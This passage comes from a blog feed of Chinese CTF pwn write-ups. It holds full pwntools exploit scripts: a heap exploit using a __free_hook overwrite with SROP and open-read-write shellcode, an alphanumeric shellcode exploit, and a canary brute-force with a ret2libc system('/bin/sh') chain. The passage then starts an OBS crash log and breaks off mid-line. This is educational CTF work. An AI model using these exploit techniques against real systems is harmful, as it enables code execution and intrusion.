"</span>, str(size))</span><br><span class="line">    <span class="keyword">if</span> len(content) == (size+<span class="number">1</span>):</span><br><span class="line">        sa(<span class="string">"Please input content: "</span>, content)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        sla(<span class="string">"Please input content: "</span>, content)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span><span class="params">(idx, content)</span>:</span></span><br><span class="line">    choice(<span class="number">3</span>)</span><br><span class="line">    sla(<span class="string">"Please input idx: "</span>, str(idx))</span><br><span class="line">    sa(<span class="string">"Please input content: "</span>, content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span><span class="params">(idx)</span>:</span></span><br><span class="line">    choice(<span class="number">2</span>)</span><br><span class="line">    sla(<span class="string">"Please input idx: "</span>, str(idx))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exit</span><span class="params">()</span>:</span></span><br><span class="line">    choice(<span class="number">4</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exp</span><span class="params">()</span>:</span></span><br><span class="line">    new(<span class="number">0x68</span>, <span class="string">'1'</span>) <span class="comment">#0</span></span><br><span class="line">    new(<span class="number">0x78</span>, <span class="string">'2'</span>) <span class="comment">#1</span></span><br><span class="line">    payload = p64(<span class="number">0</span>) + p64(<span class="number">0x21</span>)</span><br><span class="line">    new(<span class="number">0x68</span>, payload*<span class="number">6</span>) <span class="comment">#2</span></span><br><span class="line">    new(<span class="number">0x68</span>, payload*<span class="number">6</span>) <span class="comment">#3</span></span><br><span class="line">    delete(<span class="number">0</span>)</span><br><span class="line">    new(<span class="number">0x68</span>, <span class="string">'a'</span>*<span class="number">0x60</span> + p64(<span class="number">0</span>) + p8(<span class="number">0xf1</span>)) <span class="comment">#0</span></span><br><span class="line">    delete(<span class="number">1</span>)</span><br><span class="line">    delete(<span class="number">2</span>)</span><br><span class="line">    new(<span class="number">0x78</span>, <span class="string">'1'</span>) <span class="comment">#1</span></span><br><span class="line">    delete(<span class="number">0</span>)</span><br><span class="line">    new(<span class="number">0x68</span>, <span class="string">'a'</span>*<span class="number">0x60</span> + p64(<span class="number">0</span>) + p8(<span class="number">0xa1</span>)) <span class="comment">#0</span></span><br><span class="line">    delete(<span class="number">1</span>)</span><br><span class="line">    new(<span class="number">0x98</span>, <span class="string">'1'</span>) <span class="comment">#1</span></span><br><span class="line">    edit(<span class="number">1</span>, <span class="string">'b'</span>*<span class="number">0x70</span> + p64(<span class="number">0</span>) + p64(<span class="number">0x71</span>) + p16(<span class="number">0x8620</span><span class="number">-0x40</span><span class="number">-0x3</span>))</span><br><span class="line">    new(<span class="number">0x68</span>, <span class="string">'\n'</span>) <span class="comment">#2</span></span><br><span class="line">    new(<span class="number">0x68</span>, <span class="string">'\x00'</span>*<span class="number">0x33</span> + p64(<span class="number">0xfbad1800</span>) + p64(<span class="number">0</span>)*<span class="number">3</span> ) <span class="comment">#3</span></span><br><span class="line">    r(<span class="number">0x88</span>)</span><br><span class="line">    libc.address = uu64(r(<span class="number">8</span>)) - libc.symbols[<span class="string">'_IO_2_1_stdin_'</span>]</span><br><span class="line">    lg(<span class="string">"libc.addressess"</span>, libc.address)</span><br><span class="line"></span><br><span class="line">    edit(<span class="number">1</span>, <span class="string">'b'</span>*<span class="number">0x70</span> + p64(<span class="number">0</span>) + p64(<span class="number">0x91</span>))</span><br><span class="line">    delete(<span class="number">2</span>)</span><br><span class="line">    edit(<span class="number">1</span>, <span class="string">'b'</span>*<span class="number">0x70</span> + p64(<span class="number">0</span>) + p64(<span class="number">0x91</span>) + p64(<span class="number">0</span>) + p64(libc.symbols[<span class="string">'__free_hook'</span>]<span class="number">-0x20</span>))</span><br><span class="line">    new(<span class="number">0x88</span>, <span class="string">'2'</span>) <span class="comment">#2</span></span><br><span class="line">    edit(<span class="number">1</span>, <span class="string">'b'</span>*<span class="number">0x70</span> + p64(<span class="number">0</span>) + p64(<span class="number">0x71</span>))</span><br><span class="line">    delete(<span class="number">2</span>)</span><br><span class="line">    edit(<span class="number">1</span>, <span class="string">'b'</span>*<span class="number">0x70</span> + p64(<span class="number">0</span>) + p64(<span class="number">0x71</span>) + p64(libc.symbols[<span class="string">'__free_hook'</span>]<span class="number">-0x13</span>))</span><br><span class="line">    frame = SigreturnFrame()</span><br><span class="line">    frame.rdi = <span class="number">0</span></span><br><span class="line">    frame.rsi = (libc.symbols[<span class="string">'__free_hook'</span>]) &amp; <span class="number">0xfffffffffffff000</span> <span class="comment">#</span></span><br><span class="line">    frame.rdx = <span class="number">0x2000</span></span><br><span class="line">    frame.rsp = (libc.symbols[<span class="string">'__free_hook'</span>]) &amp; <span class="number">0xfffffffffffff000</span></span><br><span class="line">    frame.rip = libc.address + <span class="number">0x00000000000bc375</span> <span class="comment">#: syscall; ret; </span></span><br><span class="line">    payload = str(frame)</span><br><span class="line">    new(<span class="number">0x68</span>, payload[<span class="number">0x80</span>:<span class="number">0x80</span>+<span class="number">0x60</span>])</span><br><span class="line">    new(<span class="number">0x68</span>, <span class="string">'\x00'</span>*<span class="number">3</span> + p64(libc.symbols[<span class="string">'setcontext'</span>]+<span class="number">53</span>))</span><br><span class="line">    edit(<span class="number">1</span>, payload[:<span class="number">0x98</span>])</span><br><span class="line">    delete(<span class="number">1</span>)</span><br><span class="line">    layout = [</span><br><span class="line">        libc.address + <span class="number">0x0000000000021102</span>, <span class="comment">#: pop rdi; ret; </span></span><br><span class="line">        libc.symbols[<span class="string">'__free_hook'</span>] &amp; <span class="number">0xfffffffffffff000</span>,</span><br><span class="line">        libc.address + <span class="number">0x00000000000202e8</span>, <span class="comment">#: pop rsi; ret; </span></span><br><span class="line">        <span class="number">0x2000</span>,</span><br><span class="line">        libc.address + <span class="number">0x0000000000001b92</span>, <span class="comment">#: pop rdx; ret; </span></span><br><span class="line">        <span class="number">7</span>,</span><br><span class="line">        libc.address + <span class="number">0x0000000000033544</span>, <span class="comment">#: pop rax; ret; </span></span><br><span class="line">        <span class="number">10</span>,</span><br><span class="line">        libc.address + <span class="number">0x00000000000bc375</span>, <span class="comment">#: syscall; ret; </span></span><br><span class="line">        libc.address + <span class="number">0x0000000000002a71</span>, <span class="comment">#: jmp rsp; </span></span><br><span class="line">    ]</span><br><span class="line">    shellcode = asm(<span class="string">'''</span></span><br><span class="line"><span class="string">    push 0x67616c66</span></span><br><span class="line"><span class="string">    mov rdi, rsp</span></span><br><span class="line"><span class="string">    xor esi, esi</span></span><br><span class="line"><span class="string">    mov eax, 2</span></span><br><span class="line"><span class="string">    syscall</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    mov edi, eax</span></span><br><span class="line"><span class="string">    mov rsi, rsp</span></span><br><span class="line"><span class="string">    mov edx, 0x100</span></span><br><span class="line"><span class="string">    xor eax, eax</span></span><br><span class="line"><span class="string">    syscall</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    mov edx, eax</span></span><br><span class="line"><span class="string">    mov rsi, rsp</span></span><br><span class="line"><span class="string">    mov edi, 1</span></span><br><span class="line"><span class="string">    mov eax, edi</span></span><br><span class="line"><span class="string">    syscall</span></span><br><span class="line"><span class="string">    '''</span>)</span><br><span class="line">    shellcode = shellcraft.amd64.open(<span class="string">'flag'</span>)</span><br><span class="line">    shellcode += <span class="string">'''</span></span><br><span class="line"><span class="string">    mov edi, eax</span></span><br><span class="line"><span class="string">    mov rsi, rsp</span></span><br><span class="line"><span class="string">    mov edx, 0x100</span></span><br><span class="line"><span class="string">    xor eax, eax</span></span><br><span class="line"><span class="string">    syscall</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    mov edi, 1</span></span><br><span class="line"><span class="string">    mov rsi, rsp</span></span><br><span class="line"><span class="string">    push 1</span></span><br><span class="line"><span class="string">    pop rax</span></span><br><span class="line"><span class="string">    syscall</span></span><br><span class="line"><span class="string">    '''</span></span><br><span class="line"></span><br><span class="line">    shellcode = asm(<span class="string">'''</span></span><br><span class="line"><span class="string">    push 0x67616c66</span></span><br><span class="line"><span class="string">mov rdi,rsp</span></span><br><span class="line"><span class="string">xor esi,esi</span></span><br><span class="line"><span class="string">push 2</span></span><br><span class="line"><span class="string">pop rax</span></span><br><span class="line"><span class="string">syscall</span></span><br><span class="line"><span class="string">mov rdi,rax</span></span><br><span class="line"><span class="string">mov rsi,rsp</span></span><br><span class="line"><span class="string">mov edx,0x100</span></span><br><span class="line"><span class="string">xor eax,eax</span></span><br><span class="line"><span class="string">syscall</span></span><br><span class="line"><span class="string">mov edi,1</span></span><br><span class="line"><span class="string">mov rsi,rsp</span></span><br><span class="line"><span class="string">push 1</span></span><br><span class="line"><span class="string">pop rax</span></span><br><span class="line"><span class="string">syscall</span></span><br><span class="line"><span class="string">    '''</span>)</span><br><span class="line">    <span class="comment">#shellcode = asm(shellcode, arch='amd64')</span></span><br><span class="line">    gdb.attach(io)</span><br><span class="line">    s(flat(layout) + shellcode)</span><br><span class="line"></span><br><span class="line">    <span class="comment">#libc.address = uu64(r(8)) - libc.symbols['__IO_2_1_stdin_']</span></span><br><span class="line">    <span class="comment">#lg("libc.address", libc.address)</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            exp()</span><br><span class="line">            io.interactive()</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">            print(e)</span><br><span class="line">            io.close()</span><br><span class="line">            io = process(exe)</span><br></pre></td></tr></table></figure><h2 id="easyshellcode"><a href="#easyshellcode" class="headerlink" title="easyshellcode"></a>easyshellcode</h2><p>这个没啥好说的，用工具或者别的都行</p><h3 id="exp-3"><a href="#exp-3" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python2</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">local = <span class="number">1</span></span><br><span class="line">host = <span class="string">'127.0.0.1'</span> </span><br><span class="line">port = <span class="number">10000</span></span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line">exe = <span class="string">'./pwn'</span></span><br><span class="line">context.binary = exe</span><br><span class="line">elf = ELF(exe)</span><br><span class="line">libc = elf.libc</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#don't forget to change it</span></span><br><span class="line"><span class="keyword">if</span> local:</span><br><span class="line">    io = process(exe)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    io = remote(host,port)</span><br><span class="line"></span><br><span class="line">s    = <span class="keyword">lambda</span> data            : io.send(str(data))</span><br><span class="line">sa   = <span class="keyword">lambda</span> delim,data      : io.sendafter(str(delim), str(data))</span><br><span class="line">sl   = <span class="keyword">lambda</span> data            : io.sendline(str(data))</span><br><span class="line">sla  = <span class="keyword">lambda</span> delim,data      : io.sendlineafter(str(delim), str(data))</span><br><span class="line">r    = <span class="keyword">lambda</span> numb=<span class="number">4096</span>       : io.recv(numb)</span><br><span class="line">ru   = <span class="keyword">lambda</span> delim,drop=<span class="literal">True</span> : io.recvuntil(delim, drop)</span><br><span class="line"></span><br><span class="line">uu32 = <span class="keyword">lambda</span> data            : u32(data.ljust(<span class="number">4</span>, <span class="string">'\x00'</span>))</span><br><span class="line">uu64 = <span class="keyword">lambda</span> data            : u64(data.ljust(<span class="number">8</span>, <span class="string">'\x00'</span>))</span><br><span class="line">lg   = <span class="keyword">lambda</span> name,data       : io.success(name + <span class="string">": 0x%x"</span> % data)</span><br><span class="line"></span><br><span class="line"><span class="comment"># break on aim addr</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">debug</span><span class="params">(addr,PIE=True)</span>:</span></span><br><span class="line">    <span class="keyword">if</span> PIE:</span><br><span class="line">        text_base = int(os.popen(<span class="string">"pmap &#123;&#125;| awk '&#123;&#123;print $1&#125;&#125;'"</span>.format(io.pid)).readlines()[<span class="number">1</span>], <span class="number">16</span>)</span><br><span class="line">        gdb.attach(io,<span class="string">'b *&#123;&#125;'</span>.format(hex(text_base+addr)))</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        gdb.attach(io,<span class="string">"b *&#123;&#125;"</span>.format(hex(addr)))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#===========================================================</span></span><br><span class="line"><span class="comment">#                    EXPLOIT GOES HERE</span></span><br><span class="line"><span class="comment">#===========================================================</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Arch:     amd64-64-little</span></span><br><span class="line"><span class="comment"># RELRO:    Partial RELRO</span></span><br><span class="line"><span class="comment"># Stack:    Canary found</span></span><br><span class="line"><span class="comment"># NX:       NX enabled</span></span><br><span class="line"><span class="comment"># PIE:      No PIE (0x400000)</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exp</span><span class="params">()</span>:</span></span><br><span class="line">    buf = <span class="string">"PPYh00AAX1A0hA004X1A4hA00AX1A8QX44Pj0X40PZPjAX4znoNDnRYZnCXA"</span></span><br><span class="line">    s(buf)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    exp()</span><br><span class="line">    io.interactive()</span><br></pre></td></tr></table></figure><h2 id="easystack"><a href="#easystack" class="headerlink" title="easystack"></a>easystack</h2><p>看着很简单。。。然后不会做，后面发觉了，利用数学就可以计算出来，计算有几个比canary大的，逐字节爆破，</p><p>假如你输入了0x00000000-0xff000000,这么多个数，再加上填充到canary处的数，总共为301个<br>那计算出来的就是比canary大的数有几个，假设有70个，那在减掉填充的45个，就还有35个，意思从255开始往前数35个就是canary那一位的大小，<br>难点在封装成函数。。我觉得。。通常从低位往高位爆破，高往低，第一次写，太菜了</p><h3 id="exp-4"><a href="#exp-4" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python2</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> subprocess</span><br><span class="line"></span><br><span class="line">local = <span class="number">1</span></span><br><span class="line">host = <span class="string">'127.0.0.1'</span> </span><br><span class="line">port = <span class="number">10000</span></span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line">exe = <span class="string">'./easystack'</span></span><br><span class="line">context.binary = exe</span><br><span class="line">elf = ELF(exe)</span><br><span class="line">libc = elf.libc</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#don't forget to change it</span></span><br><span class="line"><span class="keyword">if</span> local:</span><br><span class="line">    io = process(exe)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    io = remote(host,port)</span><br><span class="line"></span><br><span class="line">s    = <span class="keyword">lambda</span> data            : io.send(str(data))</span><br><span class="line">sa   = <span class="keyword">lambda</span> delim,data      : io.sendafter(str(delim), str(data))</span><br><span class="line">sl   = <span class="keyword">lambda</span> data            : io.sendline(str(data))</span><br><span class="line">sla  = <span class="keyword">lambda</span> delim,data      : io.sendlineafter(str(delim), str(data))</span><br><span class="line">r    = <span class="keyword">lambda</span> numb=<span class="number">4096</span>       : io.recv(numb)</span><br><span class="line">ru   = <span class="keyword">lambda</span> delim,drop=<span class="literal">True</span> : io.recvuntil(delim, drop)</span><br><span class="line">uu32 = <span class="keyword">lambda</span> data            : u32(data.ljust(<span class="number">4</span>, <span class="string">'\x00'</span>))</span><br><span class="line">uu64 = <span class="keyword">lambda</span> data            : u64(data.ljust(<span class="number">8</span>, <span class="string">'\x00'</span>))</span><br><span class="line">lg   = <span class="keyword">lambda</span> s,addr          : io.success(<span class="string">'\033[1;31;40m%20s--&gt;0x%x\033[0m'</span>%(s,addr))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># break on aim addr</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">debug</span><span class="params">(addr,PIE=True)</span>:</span></span><br><span class="line">    <span class="keyword">if</span> PIE:</span><br><span class="line">        text_base = int(os.popen(<span class="string">"pmap &#123;&#125;| awk '&#123;&#123;print $1&#125;&#125;'"</span>.format(io.pid)).readlines()[<span class="number">1</span>], <span class="number">16</span>)</span><br><span class="line">        gdb.attach(io,<span class="string">'b *&#123;&#125;'</span>.format(hex(text_base+addr)))</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        gdb.attach(io,<span class="string">"b *&#123;&#125;"</span>.format(hex(addr)))</span><br><span class="line"></span><br><span class="line"><span class="comment"># get_one_gadget</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">one_gadget</span><span class="params">(filename)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> map(int, subprocess.check_output([<span class="string">'one_gadget'</span>, <span class="string">'--raw'</span>, filename]).split(<span class="string">' '</span>))</span><br><span class="line"><span class="comment">#one_gadget = one_gadget(libc.path)</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#===========================================================</span></span><br><span class="line"><span class="comment">#                    EXPLOIT GOES HERE</span></span><br><span class="line"><span class="comment">#===========================================================</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Arch:     i386-32-little</span></span><br><span class="line"><span class="comment"># RELRO:    Full RELRO</span></span><br><span class="line"><span class="comment"># Stack:    Canary found</span></span><br><span class="line"><span class="comment"># NX:       NX enabled</span></span><br><span class="line"><span class="comment"># PIE:      No PIE (0x8048000)</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">burp_canary</span><span class="params">(idx, canary=<span class="number">0</span>)</span>:</span></span><br><span class="line">    num = <span class="number">301</span></span><br><span class="line">    sla(<span class="string">": "</span>, num)</span><br><span class="line">    start = <span class="number">1</span></span><br><span class="line">    end = start + <span class="number">0xff</span> </span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> xrange(start, end):</span><br><span class="line">        payload = str(canary + (i &lt;&lt; ((<span class="number">3</span>-idx)*<span class="number">8</span>)))</span><br><span class="line">        print(<span class="string">"payload: "</span>, payload)</span><br><span class="line">        sla(<span class="string">":"</span>, payload)</span><br><span class="line">    <span class="keyword">for</span> _ <span class="keyword">in</span> xrange(<span class="number">45</span>):</span><br><span class="line">        payload = str(canary + (<span class="number">0xff</span> &lt;&lt; ((<span class="number">3</span>-idx)*<span class="number">8</span>)))</span><br><span class="line">        sla(<span class="string">":"</span>, payload)</span><br><span class="line">    sla(<span class="string">":"</span>, <span class="string">"0"</span>)</span><br><span class="line">    ru(<span class="string">"answer is "</span>)</span><br><span class="line">    answer = int(r(<span class="number">3</span>))</span><br><span class="line">    canary = <span class="number">0xff</span> - (answer <span class="number">-45</span>)</span><br><span class="line">    sla(<span class="string">"(y or n)\n"</span>, <span class="string">"y"</span>)</span><br><span class="line">    <span class="keyword">return</span> canary</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_canary</span><span class="params">()</span>:</span></span><br><span class="line">    canary1 = burp_canary(<span class="number">0</span>) &lt;&lt; <span class="number">24</span></span><br><span class="line">    canary2 = burp_canary(<span class="number">1</span>, canary1) &lt;&lt; <span class="number">16</span></span><br><span class="line">    canary3 = burp_canary(<span class="number">2</span>, canary1 + canary2) &lt;&lt; <span class="number">8</span></span><br><span class="line">    canary = canary1 + canary2 + canary3</span><br><span class="line">    lg(<span class="string">"canary1"</span>, canary1)</span><br><span class="line">    lg(<span class="string">"canary2"</span>, canary2)</span><br><span class="line">    lg(<span class="string">"canary3"</span>, canary3)</span><br><span class="line">    lg(<span class="string">"canary"</span>, canary)</span><br><span class="line">    <span class="keyword">return</span> canary</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exp</span><span class="params">()</span>:</span></span><br><span class="line">    canary = get_canary()</span><br><span class="line">    num = <span class="number">308</span></span><br><span class="line">    sla(<span class="string">"How much do you want to calc: "</span>, <span class="number">308</span>)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> xrange(<span class="number">300</span>):</span><br><span class="line">        sla(<span class="string">":"</span>, str(<span class="number">0xffffffff</span>))</span><br><span class="line">    sla(<span class="string">":"</span>, str(canary))</span><br><span class="line">    <span class="keyword">for</span> _ <span class="keyword">in</span> xrange(<span class="number">3</span>):</span><br><span class="line">        sla(<span class="string">":"</span>, str(<span class="number">1</span>))</span><br><span class="line">    puts_plt = elf.plt[<span class="string">'_ZStlsISt11char_traitsIcEERSt13basic_ostreamIcT_ES5_PKc'</span>]</span><br><span class="line">    ret_addr = <span class="number">0x80488E7</span></span><br><span class="line">    cout = <span class="number">0x804A0C0</span></span><br><span class="line">    __libc_start_main_got = elf.got[<span class="string">'__libc_start_main'</span>]</span><br><span class="line">    sla(<span class="string">":"</span>, str(puts_plt))</span><br><span class="line">    sla(<span class="string">":"</span>, str(ret_addr))</span><br><span class="line">    sla(<span class="string">":"</span>, str(cout))</span><br><span class="line">    sla(<span class="string">":"</span>, str(__libc_start_main_got))</span><br><span class="line">    sla(<span class="string">"n)"</span>, <span class="string">"y"</span>)</span><br><span class="line">    ru(<span class="string">"\n"</span>)</span><br><span class="line">    addr = uu32(r(<span class="number">4</span>))</span><br><span class="line">    libc.address = addr - libc.symbols[<span class="string">'__libc_start_main'</span>]</span><br><span class="line">    lg(<span class="string">"addr"</span>, addr)</span><br><span class="line">    <span class="comment">#gdb.attach(io)</span></span><br><span class="line"></span><br><span class="line">    num = <span class="number">306</span></span><br><span class="line">    sla(<span class="string">"How much do you want to calc: "</span>, <span class="number">308</span>)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> xrange(<span class="number">300</span>):</span><br><span class="line">        sla(<span class="string">":"</span>, str(<span class="number">0xffffffff</span>))</span><br><span class="line">    sla(<span class="string">":"</span>, str(canary))</span><br><span class="line">    <span class="keyword">for</span> _ <span class="keyword">in</span> xrange(<span class="number">3</span>):</span><br><span class="line">        sla(<span class="string">":"</span>, str(<span class="number">1</span>))</span><br><span class="line">    sla(<span class="string">":"</span>, str(libc.symbols[<span class="string">'system'</span>]))</span><br><span class="line">    sla(<span class="string">":"</span>, str(ret_addr))</span><br><span class="line">    sla(<span class="string">":"</span>, str(libc.search(<span class="string">"/bin/sh"</span>).next()))</span><br><span class="line">    sla(<span class="string">"stop): "</span>, <span class="string">"0"</span>)</span><br><span class="line">    sla(<span class="string">"n)"</span>, <span class="string">"n"</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    exp()</span><br><span class="line">    io.interactive()</span><br></pre></td></tr></table></figure><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><ol><li>这几道题学到了好多东西</li><li>shellcode编写，mprotect改内存页权限，SROP</li></ol><p><strong>本文作者</strong>：NoOne<br><strong>本文地址</strong>： <a href="https://noone-hub.github.io/posts/89fa1574/">https://noone-hub.github.io/posts/89fa1574/</a><br><strong>版权声明</strong>：转载请注明出处！</p><!-- rebuild by neat -->]]></content>
      <categories>
        <category>writeup</category>
      </categories>
      <tags>
        <tag>二进制,pwn</tag>
      </tags>
  </entry>
  <entry>
    <title>日常生活记录的漏洞点</title>
    <url>/posts/a0edc8cf/</url>
    <content><![CDATA[<h1 id="obs-pwn"><a href="#obs-pwn" class="headerlink" title="obs_pwn"></a>obs_pwn</h1><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">└──╼ <span class="variable">$obs</span> </span><br><span class="line">Attempted path: share/obs/obs-studio/locale/en-US.ini</span><br><span class="line">Attempted path: /usr/share/obs/obs-studio/locale/en-US.ini</span><br><span class="line">Attempted path: share/obs/obs-studio/locale.ini</span><br><span class="line">Attempted path: /usr/share/obs/obs-studio/locale.ini</span><br><span class="line">Attempted path: share/obs/obs-studio/themes/Dark.qss</span><br><span class="line">Attempted path: /usr/share/obs/obs-studio/themes/Dark.qss</span><br><span class="line">info: CPU Name: Intel(R) Core(TM) i7-7500U CPU @ 2.70GHz</span><br><span class="line">info: CPU Speed: 3480.843MHz</span><br><span class="line">info: Physical Cores: 2, Logical Cores: 4</span><br><span class="line">info: Physical Memory: 11782MB Total, 3611MB Free</span><br><span class="line">info: Kernel Version: Linux 5.2.0-2parrot1-amd64</span><br><span class="line">info: Distribution: <span class="string">"Parrot GNU/Linux"</span> <span class="string">"4.7"</span></span><br><span class="line">info: Window System: X11.0, Vendor: The X.Org Foundation, Version: 1.20.4</span><br><span class="line">info: Portable mode: <span class="literal">false</span></span><br><span class="line">Attempted path: share/obs/obs-studio/themes/Dark/no_sources.svg</span><br><span class="line">Attempted path: /usr/share/obs/obs-studio/themes/Dark/no_sources.svg</span><br><span class="line">QMetaObject::connectSlotsByName: No matching signal <span class="keyword">for</span> on_advAudioProps_clicked()</span><br><span class="line">QMetaObject::connectSlotsByName: No matching signal <span class="keyword">for</span> on_advAudioProps_destroyed()</span><br><span class="line">QMetaObject::connectSlotsByName: No matching signal <span class="keyword">for</span> on_program_customContextMenuRequested(QPoint)</span><br><span class="line">info: OBS 0.0.1 (linux)</span><br><span class="line">info: ---------------------------------</span><br><span class="line">info: ---------------------------------</span><br><span class="line">info: audio settings reset:</span><br><span class="line">	samples per sec: 44100</span><br><span class="line">	speakers:        2</span><br><span class="line">info: ---------------------------------</span><br><span class="line">info: Initializing OpenGL...</span><br><span class="line">info: Loading up OpenGL on adapter Intel Open Source Technology Center Mesa DRI Intel(R) HD Graphics 620 (Kaby Lake GT2) </span><br><span class="line">info: OpenGL loaded successfully, version 4.5 (Core Profile) Mesa 19.1.6, shading language 4.50</span><br><span class="line">info: ---------------------------------</span><br><span class="line">info: video settings reset:</span><br><span class="line">	base resolution:   1920x1080</span><br><span class="line">	output resolution: 1280x720</span><br><span class="line">	downscale filter:  Bicubic</span><br><span class="line">	fps:               30/1</span><br><span class="line">	format:            NV12</span><br><span class="line">	YUV mode:          601/Partial</span><br><span class="line">info: NV12 texture support not available</span><br><span class="line">info: Audio monitoring device:</span><br><span class="line">	name: Default</span><br><span class="line">	id: default</span><br><span class="line">info: ---------------------------------</span><br><span class="line">warning: Failed to load <span class="string">'en-US'</span> text <span class="keyword">for</span> module: <span class="string">'decklink-ouput-ui.so'</span></span><br><span class="line">libDeckLinkAPI.so: cannot open shared object file: No such file or directory</span><br><span class="line">info: No blackmagic support</span><br><span class="line">info: FFMPEG VAAPI supported</span><br><span class="line">info: VLC found, VLC video <span class="built_in">source</span> enabled</span><br><span class="line">info: ---------------------------------</span><br><span class="line">info:   Loaded Modules:</span><br><span class="line">info:     vlc-video.so</span><br><span class="line">info:     text-freetype2.so</span><br><span class="line">info:     rtmp-services.so</span><br><span class="line">info:     obs-x264.so</span><br><span class="line">info:     obs-transitions.so</span><br><span class="line">info:     obs-outputs.so</span><br><span class="line">info:     obs-filters.so</span><br><span class="line">info:     obs-ffmpeg.so</span><br><span class="line">info:     linux-v4l2.so</span><br><span class="line">info:     linux-pulseaudio.so</span><br><span class="line">info:     linux-jack.so</span><br><span class="line">info:     linux-decklink.so</span><br><span class="line">info:     linux-capture.so</span><br><span class="line">info:     linux-alsa.so</span><br><span class="line">info:     image-source.so</span><br><span class="line">info:     frontend-tools.so</span><br><span class="line">info:     decklink-ouput-ui.so</span><br><span class="line">info: ---------------------------------</span><br><span class="line">info: ==== Startup complete ===============================================</span><br><span class="line">error: Service <span class="string">''</span> not found</span><br><span class="line">info: No scene file found, creating default scene</span><br><span class="line">info: All scene data cleared</span><br><span class="line">info: ------------------------------------------------</span><br><span class="line">info: pulse-input: Server name: <span class="string">'pulseaudio 13.0'</span></span><br><span class="line">info: pulse-input: Audio format: s16le, 44100 Hz, 2 channels</span><br><span class="line">info: pulse-input: Started recording from <span class="string">'alsa_output.pci-0000_00_1f.3.analog-stereo.monitor'</span></span><br><span class="line">info: pulse-input: Server name: <span class="string">'pulseaudio 13.0'</span></span><br><span class="line">info: pulse-input: Audio format: s16le, 44100 Hz, 2 channels</span><br><span class="line">info: pulse-input: Started recording from <span class="string">'alsa_input.pci-0000_00_1f.3.analog-stereo'</span></span><br><span class="line">info: Switched to scene <span class="string">'Scene'</span></span><br><span class="line">warning: Failed to glob scene collections</span><br><span class="line">Attempted path: share/obs/obs-studio/images/overflow.png</span><br><span class="line">Attempted path: /usr/share/obs/obs-studio/images/overflow.png</span><br><span class="line">info: adding 23 milliseconds of audio buffering, total audio buffering is now 23 milliseconds (<span class="built_in">source</span>: Mic/Aux)</span><br><span class="line"></span><br><span class="line">^Cinfo: ==== Shutting down ==================================================</span><br><span class="line">info: Switched to scene <span class="string">'(null)'</span></span><br><span class="line">info: pulse-input: Stopped recording from <span class="string">'alsa_output.pci-0000_00_1f.3.analog-stereo.monitor'</span></span><br><span class="line">info: pulse-input: Got 125 packets with 32338 frames</span><br><span class="line">info: pulse-input: Stopped recording from <span class="string">'alsa_input.pci-0000_00_1f.3.analog-stereo'</span></span><br><span class="line">info: pulse-input: Got 271 packets with 118520 frames</span><br><span class="line">info: All scene data cleared</span><br><span class="line">info: ------------------------------------------------</span><br><span class="line">double free or 